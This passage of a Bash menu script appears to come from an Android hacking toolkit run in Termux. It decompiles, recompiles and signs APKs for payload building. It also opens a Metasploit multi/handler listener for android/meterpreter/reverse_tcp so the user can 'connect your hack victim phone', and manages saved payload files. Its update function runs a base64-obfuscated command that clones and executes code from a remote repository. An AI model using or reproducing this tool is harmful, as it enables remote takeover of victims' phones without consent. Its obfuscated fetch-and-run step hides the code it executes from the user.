echo -e "  ${red}+${black}——${yellow}——${black}——${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}——${red}+${finished}\n"
echo -n -e "[ッ]${whiteredmix}Write Enter${finished}${black}:${redlite}> ${white}"
read type
case $type in
      1) decompile_apk
      ;;
      2) recompile_apk
      ;;
      3) signed_apk
      ;;
      4) reset
      dec_rec_sig_apk
      ;;
      0) main_menu
      ;;
      *) echo
         echo -e " ${whitelite}[${redlite}~${whitelite}] ${bluelite}Wrong ${cyanlite}Input ${bluelite}Try ${cyanlite}Again${redlite}.${finished}"
         sleep 3
         dec_rec_sig_apk
      ;;
esac
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function decompile_apk(){
clear;reset
printf """${red}┌──────────────────────────────────────────┐
${red}│                                          ${red}│
${red}│${yellow}   ▄▄          █      ▄    ▄            █ ${red}│
${red}│${yellow}   ██   ▄▄▄▄   █   ▄  ██  ██  ▄▄▄    ▄▄▄█ ${red}│
${red}│${yellow}  █  █  █▀ ▀█  █ ▄▀   █ ██ █ █▀ ▀█  █▀ ▀█ ${red}│
${red}│${yellow}  █▄▄█  █   █  █▀█    █ ▀▀ █ █   █  █   █ ${red}│
${red}│${yellow} █    █ ██▄█▀  █  ▀▄  █    █ ▀█▄█▀  ▀█▄██ ${red}│
${red}│${yellow}        █                                 ${red}│
${red}│        ▀     ${redlite}Powered By Apktool          ${red}│
${red}└──────────────────────────────────────────┘\n${finished}"""
echo -e "${black}+———————————————${red}[ ${green}Decompiler Apkmod ${red}]${black}————————————————+"
echo -e "${red}[${green}INFO${red}]${cyan} If want to decompile any apk then give just that apk path location example${redlite}: ${yellowlite}/sdcard/HTTPNET/FlappyBird.apk ${cyan}automatically decompile your apk ${bluelite}HTTPNET ${cyan}phone memory folder Enjoy${redlite}.${bluemix}هللا${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
echo -e ""
#Apkmod Decompiling Apk
read -p "[*] Enter FilepathApk#~: " path
echo -e "${yellowlite}[*] Decoding resource Started${whitelite}..;${yellowlite}I\e[0m"
echo -e "${yellowlite}[*] Please wait process is running${whitelite}...${finished}"
rm -rf /sdcard/HTTPNET/decompiled;apkmod -d -i $path -o /sdcard/HTTPNET/decompiled
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function recompile_apk(){
clear;reset
printf """${red}┌──────────────────────────────────────────┐
${red}│                                          ${red}│
${red}│${yellow}   ▄▄          █      ▄    ▄            █ ${red}│
${red}│${yellow}   ██   ▄▄▄▄   █   ▄  ██  ██  ▄▄▄    ▄▄▄█ ${red}│
${red}│${yellow}  █  █  █▀ ▀█  █ ▄▀   █ ██ █ █▀ ▀█  █▀ ▀█ ${red}│
${red}│${yellow}  █▄▄█  █   █  █▀█    █ ▀▀ █ █   █  █   █ ${red}│
${red}│${yellow} █    █ ██▄█▀  █  ▀▄  █    █ ▀█▄█▀  ▀█▄██ ${red}│
${red}│${yellow}        █                                 ${red}│
${red}│        ▀     ${redlite}Powered By Apktool          ${red}│
${red}└──────────────────────────────────────────┘\n${finished}"""
echo -e "${black}+———————————————${red}[ ${green}Recompiler Apkmod ${red}]${black}————————————————+"
echo -e "${red}[${green}INFO${red}]${cyan} If want to recompile your decompile apk then give just that path location example${redlite}: ${yellowlite}/sdcard/HTTPNET/decompiled ${cyan}automatically recompile your apk ${bluelite}HTTPNET ${cyan}phone memory folder Enjoy${redlite}.${bluemix}هللا${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
echo -e ""
#Apkmod Recompiling Apk
read -p "[*] Enter FilepathApk#~: " path
echo -e "${yellowlite}[*] Recoding resource Started${whitelite}..;${yellowlite}I\e[0m"
echo -e "${yellowlite}[*] Please wait process is running${whitelite}...${finished}"
apkmod -r -i $path -o /sdcard/HTTPNET/Compiled.apk
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function signed_apk(){
clear;reset
printf """${red}┌──────────────────────────────────────────┐
${red}│                                          ${red}│
${red}│${yellow}   ▄▄          █      ▄    ▄            █ ${red}│
${red}│${yellow}   ██   ▄▄▄▄   █   ▄  ██  ██  ▄▄▄    ▄▄▄█ ${red}│
${red}│${yellow}  █  █  █▀ ▀█  █ ▄▀   █ ██ █ █▀ ▀█  █▀ ▀█ ${red}│
${red}│${yellow}  █▄▄█  █   █  █▀█    █ ▀▀ █ █   █  █   █ ${red}│
${red}│${yellow} █    █ ██▄█▀  █  ▀▄  █    █ ▀█▄█▀  ▀█▄██ ${red}│
${red}│${yellow}        █                                 ${red}│
${red}│        ▀     ${redlite}Powered By Apktool          ${red}│
${red}└──────────────────────────────────────────┘\n${finished}"""
echo -e "${black}+———————————————${red}[ ${green}Signner Apkmod ${red}]${black}————————————————+"
echo -e "${red}[${green}INFO${red}]${cyan} If want to your recompile apk signed then give just that path location example${redlite}: ${yellowlite}/sdcard/HTTPNET/Compiled.apk ${cyan}automatically signed your apk ${bluelite}HTTPNET ${cyan}phone memory folder Enjoy${redlite}.${bluemix}هللا${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
echo -e ""
#Apkmod Signing Apk
read -p "[*] Enter FilepathApk#~: " path
echo -e "${yellowlite}[*] Signing compiled.apk Started${whitelite}..;${yellowlite}I\e[0m"
echo -e "${yellowlite}[*] Please wait process is running${whitelite}...${finished}"
apkmod -s -i $path -o /sdcard/HTTPNET/Signed.apk;rm -rf /sdcard/HTTPNET/Signed.apk.idsig;rm -rf /sdcard/HTTPNET/Compiled.apk
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function metasploitlistener(){
clear;reset
echo -e "${black}+-------------------------------------------------------+${finished}"
echo -e "${whitelite}[${purple}INFO${whitelite}]${cyan} Hello user${redlite}, ${cyan}use this shortcut just copy and paste to connect your hack victim phone${redlite}, ${cyan}if you generate payload using android platform with ${greenlite}android/meterpreter/reverse_tcp ${cyan}and same lport ${greenlite}22222${redlite}, ${cyan}then you can continue to connect your victim${redlite}, ${cyan}or if you generate payload with other methods and lport${redlite}, ${cyan}then you need to change this two green command${redlite}, ${cyan}i hope you like it enjoy${redlite}.🥀👀 \n${yellowlite}use exploit/multi/handler \nset payload ${greenlite}android/meterpreter/reverse_tcp \n${yellowlite}set lhost 0.0.0.0 \nset lport ${greenlite}22222 \n${yellowlite}show options \nexploit${finished}"
echo -e "${black}+-------------------------------------------------------+${finished}"
msfconsole
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function ighoststart_server(){
clear;reset
echo -e "${black}+———————————————${red}[ ${green}ighoststart Server ${red}]${black}———————————————+"
echo -e "${red}[${yellow}INFO${red}]${cyan} Hello user${redlite}, ${cyan}You can easily start this server${redlite}, ${cyan}using this shortcut${redlite}, ${cyan}just write ${yellowlite}ighoststart ${cyan}and enter${redlite}, ${cyan}if you facing any Error issues then first stop this server using exit or click CTRL c${redlite}, ${cyan}and write ${yellowlite}fixnodejs ${cyan}and enter and follow instructions${redlite}.${finished}"
echo -e "${black}+————————————————————————————————————————————————————+${finished}"
cd $HOME/ANDroidPAY/AGITFOLDER/server/;node index.js
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function allfsaved(){
echo -e "${finished}"
clear
toilet -f smmono9 "Select OptioN" | lolcat
echo -e " ${red}+${yellow}———${black}———${yellow}———${black}———${red}[ ${green}Secondary~Menu${red} ]${yellow}———${black}———${yellow}———${black}———${red}+${finished}"
echo -e "  ${black}| ${red}[${white}1${red}] ${yellow}All TermuxFile${redlite}(${yellowlite}saved${redlite})               ${black}|\n     ${black}|${finished}"
echo -e "  ${cyanlite}| ${red}[${white}2${red}] ${yellow}Termux Saved File${redlite}(${yellowlite}clear${redlite})            ${cyanlite}|\n     ${black}|${finished}"
echo -e "  ${black}| ${red}[${white}3${red}] ${yellow}Script Coming Soon${redlite}..                ${black}|\n     ${black}|${finished}"
echo -e "  ${cyanlite}| ${red}[${white}0${red}] ${yellow}Go Back Menu                        ${cyanlite}|${finished}"
echo -e "  ${red}+${black}——${yellow}——${black}——${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}———${yellow}———${black}——${red}+${finished}\n"
echo -n -e "   [ッ]${whiteredmix}Write Enter${finished}${black}:${redlite}> ${white}"
read type
case $type in
      1)
      clear
      toilet -f smmono9 File-Saved | lolcat
      echo -e "${red}[${green}INFO${red}] ${cyan}If you want to move payload to phone memory, ${cyan}Then write ${yellowlite}y${cyan} and enter Your File Will be ${yellowlite}/sdcard/HTTPNET ${cyan}moved, directory Enjoy${redlite}.${bluemix}هللا${finished}"
      echo -e "${red}[${green}=${red}] ${purple}See Your Files\n${black}|-------------------------------------------------|${finished}\n"
      ls -A $PREFIX/share/AllSavedFile/Payload
      echo -e "\n${black}|-------------------------------------------------|${finished}"
      echo -n -e "\n${white}[㌹] ${bluelite}Do you want to continue ${redlite}(${greenlite}y${whitelite}/${greenlite}n${redlite})${black}:${redlite}> ${white}"
      read type
        if [ $type == 'y' ]
         then
            cd $PREFIX/share/AllSavedFile/Payload/;mv * /sdcard/HTTPNET
            echo -e "${red}[${green}●${red}] ${green}Your File Successfully Moved${finished}"
            backmenu
         elif [ $type == 'n' ]
          then
            allfsaved
         else
            echo -e " [-] Invalid Input " | lolcat
            sleep 3
            allfsaved
        fi
      ;;
      2)
      clear
      toilet -f smmono9 File-Cleared | lolcat
      echo -e "${red}[${green}INFO${red}] ${cyan}This Module will delete all the files present\n ${yellowlite}$PREFIX/ ${cyan}directory of your ${yellowlite}/share/AllSavedFile/Payload ${cyan}Enjoy${redlite}.${bluemix}هللا${finished}"
      echo -e "${red}[${green}=${red}] ${purple}See Your Files\n${black}|-------------------------------------------------|${finished}\n"
      ls -A $PREFIX/share/AllSavedFile/Payload
      echo -e "\n${black}|-------------------------------------------------|${finished}"
      echo -n -e "\n${white}[㌹] ${bluelite}Do you want to continue ${redlite}(${greenlite}y${whitelite}/${greenlite}n${redlite})${black}:${redlite}> ${white}"
      read type
        if [ $type == 'y' ]
         then
            cd $PREFIX/share/AllSavedFile/Payload/;rm -rf *
            echo -e "${red}[${green}●${red}] ${green}Your File Successfully Cleared${finished}"
            backmenu
         elif [ $type == 'n' ]
          then
            allfsaved
         else
            echo -e " [-] Invalid Input " | lolcat
            sleep 3
            allfsaved
        fi
      ;;
      3)
      clear
      reset
      echo -e "${red}Be patient when i add a more function then you can use this option 🥀🙂${finished}"
      ;;
      0) main_menu
      ;;
      *) echo " [-] Invalid Input " | lolcat
         sleep 3
         allfsaved
      ;;
esac
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function update(){
toilet -f mono9 -F border "Update" | lolcat
echo -e "${yellow}[${red}+${yellow}] ${blue}>> ${greenredmix}DOWNLOAD LATEST UPDATE${finished} ${blue}>>\n${redlite}[${green}INFO${redlite}] ${cyanlite}After finished update this script then re-enter again this tool, use ${yellowlite}cd ~/ANDroidPAY ${cyanlite}And run again\n${yellowlite}./ANDroidPAY.sh${finished}\n"
echo -e "${redlite}[${green}✔${redlite}] ${white}Please wait Script Updating${redlite}...\n    ${white}This process is just few seconds${finished}"
sleep 10
source <(echo 'cm0gLXJmICRIT01FL0FORHJvaWRQQVk7Y2QgJEhPTUU7Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9Nckdob3N0T2ZmaWNpYWwvQU5Ecm9pZFBBWS5naXQ7Y2Qgfi9BTkRyb2lkUEFZO2NobW9kICt4IEFORHJvaWRQQVkuc2g7Y2xlYXI7Y293c2F5IC1mIGdob3N0YnVzdGVycy5jb3cgTXJHSE9TVDtlY2hvO2xzO2VjaG87c2xlZXAgMg==' | base64 -d)
}

#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function telegram(){
toilet -f mono9 -F border "Telegram" | lolcat
echo -e "${red}[${green}INFO${red}] ${cyan}Hello User${redlite}, ${cyan}Welcome to My telegram Group if you need Any help about my script or you are facing this script try to any problem${redlite}, ${cyan}then contact on my telegram group i well try to help you and if you have also github account then dont forget to Follow/Stars Me on GitHub${redlite}, ${cyan}Thanks for with us ENJOY${whitelite}.${redlite}(🥀😎)${finished}"
termux-open-url "https://t.me/MrGhostClassic"
sleep 3
backmenu
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function backmenu(){
echo -e "${finished}"
echo -e "${purplelite}if you dont understand how to Use it then follow\nme telegram group or my youtube channel.\n  ${black}+----------${red}[ ${green}Secondary~Menu${red} ]${black}--------------+\n   | ${red}[${green}1${red}] ${yellow}Main-menu                          ${black}|\n   | ${red}[${white}e${red}] ${yellow}Exit                               ${black}|\n   ${black}+----------------------------------------+${finished}\n"
echo -n -e "[ッ]${whiteredmix}Write Enter${finished}${black}:${redlite}> ${white}"
read type
case $type in
      1) main_menu
      ;;
      e) logout_menu
      ;;
      *) echo
         echo -e " ${whitelite}[${redlite}~${whitelite}] ${bluelite}Wrong ${cyanlite}Input ${bluelite}Try ${cyanlite}Again${redlite}.${finished}"
         sleep 3
         backmenu
      ;;
esac
}
#Binary_: 01010011 01101111 01101101 01110010 01100001 01100001 01110100
function logout_menu(){
echo -e "${finished}"
clear;reset
toilet -f smmono9 -F gay "MrGhost-Tool"
echo -e "   ${black}+----------------------------------------+\n${black}   |     ${green}Thanks for using This Script Tool  ${black}|\n${black}   |        ${yellow}See you at next time            ${black}|\n   ${black}|----------------------------------------|\n${black}   |           ${cyan}Bye Bye ${white}( ${red}^${cyan}_${red}^ ${white})${whitelite}/             ${black}|\n   ${black}+----------------------------------------+${finished}"
echo -e "        Friends keep supporting me and \n        Motivating me for making new tools \n        FOR YOU ENJOY..🥀🌚\n        Thanks for using my tools bye!\n" | lolcat
sleep 1
exit 0
}

main_menu
